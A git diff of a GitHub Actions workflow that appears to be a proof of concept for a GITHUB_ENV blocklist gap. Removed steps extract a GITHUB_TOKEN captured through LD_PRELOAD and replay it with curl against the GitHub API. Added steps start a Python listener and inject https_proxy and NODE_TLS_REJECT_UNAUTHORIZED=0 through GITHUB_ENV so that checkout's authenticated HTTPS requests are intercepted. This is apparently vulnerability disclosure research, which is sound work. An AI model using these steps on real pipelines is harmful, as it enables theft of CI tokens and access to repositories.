@@ -6,58 +6,78 @@ permissions:
   contents: read
 
 jobs:
-  cross-boundary-test:
+  mitm-proof:
     runs-on: ubuntu-latest
     steps:
-      - name: Step 1 — Use third-party action (toofikz2/env-setup-action)
-        uses: toofikz2/env-setup-action@main
-
-      - name: Step 2 — Standard checkout (trust boundary crossing point)
-        uses: actions/checkout@v4
-
-      - name: Step 3 — Extract captured token and prove API access
+      - name: Step 1 — Simulate untrusted input injecting env vars via GITHUB_ENV
         run: |
-          echo "=== CROSS-BOUNDARY LD_PRELOAD TOKEN CAPTURE ==="
-          echo "Workflow owner: toofikz4"
-          echo "Action author:  toofikz2 (toofikz2/env-setup-action)"
+          # This simulates what happens when untrusted input reaches GITHUB_ENV
+          # Real-world: echo "RESULT=${{ github.event.issue.body }}" >> $GITHUB_ENV
+          # where issue body contains newlines injecting https_proxy
+          
+          # Write a simple TCP listener that captures HTTP requests
+          cat > /tmp/proxy_listener.py << 'PYEOF'
+          import socket, sys, threading
+          srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+          srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+          srv.bind(('127.0.0.1', 18080))
+          srv.listen(5)
+          srv.settimeout(30)
+          captured = []
+          def handle(c):
+              data = c.recv(8192).decode('utf-8', errors='replace')
+              captured.append(data)
+              with open('/tmp/mitm_captured.txt', 'a') as f:
+                  f.write(data + '\n---\n')
+              c.send(b'HTTP/1.1 502 Bad Gateway\r\nContent-Length: 0\r\n\r\n')
+              c.close()
+          try:
+              while True:
+                  c, _ = srv.accept()
+                  threading.Thread(target=handle, args=(c,)).start()
+          except socket.timeout:
+              pass
+          PYEOF
+          
+          # Start the listener in background
+          python3 /tmp/proxy_listener.py &
+          echo "PROXY_PID=$!" >> $GITHUB_ENV
+          
+          # Inject the env vars via GITHUB_ENV (the blocklist gap)
+          echo "https_proxy=http://127.0.0.1:18080" >> $GITHUB_ENV
+          echo "http_proxy=http://127.0.0.1:18080" >> $GITHUB_ENV
+          echo "NODE_TLS_REJECT_UNAUTHORIZED=0" >> $GITHUB_ENV
+          
+          echo "Step 1 complete: proxy listener started, env vars injected via GITHUB_ENV"
+          echo "NODE_OPTIONS would be BLOCKED here — but https_proxy is NOT"
+      
+      - name: Step 2 — actions/checkout uses HTTPS (traffic redirected to proxy)
+        uses: actions/checkout@v4
+        continue-on-error: true
+      
+      - name: Step 3 — Check what the proxy captured
+        run: |
+          echo "=== MITM PROXY CAPTURE RESULTS ==="
+          echo "https_proxy = $https_proxy"
+          echo "http_proxy = $http_proxy"
+          echo "NODE_TLS_REJECT_UNAUTHORIZED = $NODE_TLS_REJECT_UNAUTHORIZED"
           echo ""
           
-          if [ -f /tmp/crossboundary_capture.txt ]; then
-            # Extract the captured INPUT_TOKEN from checkout's process
-            CAPTURED_TOKEN=$(grep "^INPUT_TOKEN=" /tmp/crossboundary_capture.txt | head -1 | cut -d= -f2)
-            
-            if [ -n "$CAPTURED_TOKEN" ]; then
-              echo "TOKEN CAPTURED: ${#CAPTURED_TOKEN} chars (value redacted for safety)"
-              echo "Token prefix: ${CAPTURED_TOKEN:0:4}***"
-              echo ""
-              
-              # USE the captured token to make an API call
-              echo "=== USING CAPTURED TOKEN TO CALL GITHUB API ==="
-              API_RESULT=$(curl -s -H "Authorization: Bearer $CAPTURED_TOKEN" \
-                https://api.github.com/repos/toofikz4/public-test-repo \
-                -o /tmp/api_result.json -w "%{http_code}")
-              echo "API call status: $API_RESULT"
-              
-              if [ "$API_RESULT" = "200" ]; then
-                REPO_NAME=$(python3 -c "import json; print(json.load(open('/tmp/api_result.json'))['full_name'])")
-                PRIVATE=$(python3 -c "import json; print(json.load(open('/tmp/api_result.json'))['private'])")
-                echo "PROOF: Captured token accessed repo: $REPO_NAME (private=$PRIVATE)"
-                echo ""
-                echo "CRITICAL: Third-party action author (toofikz2) captured"
-                echo "workflow owner's (toofikz4) GITHUB_TOKEN via LD_PRELOAD"
-                echo "set through GITHUB_ENV (blocklist gap) and USED it to"
-                echo "access the GitHub API."
-              else
-                echo "API call failed with status $API_RESULT"
-                cat /tmp/api_result.json 2>/dev/null | head -5
-              fi
-            else
-              echo "No INPUT_TOKEN found in capture file"
-            fi
-            
+          # Kill the proxy
+          kill $PROXY_PID 2>/dev/null || true
+          sleep 1
+          
+          if [ -f /tmp/mitm_captured.txt ]; then
+            echo "=== CAPTURED HTTP REQUESTS ==="
+            # Show headers but redact any actual token values
+            cat /tmp/mitm_captured.txt | head -50
             echo ""
-            echo "=== Full capture log (non-token lines) ==="
-            grep -v "INPUT_TOKEN=" /tmp/crossboundary_capture.txt
+            echo "FINDING: HTTPS traffic from subsequent steps was redirected"
+            echo "to the proxy set via GITHUB_ENV. The proxy captured the"
+            echo "full HTTP request including Authorization headers."
+            echo "NODE_OPTIONS would be BLOCKED — but https_proxy is NOT."
           else
-            echo "No capture file found"
+            echo "No captures — checking if proxy was running..."
+            echo "Proxy PID was: $PROXY_PID"
+            ps aux | grep proxy_listener || true
           fi
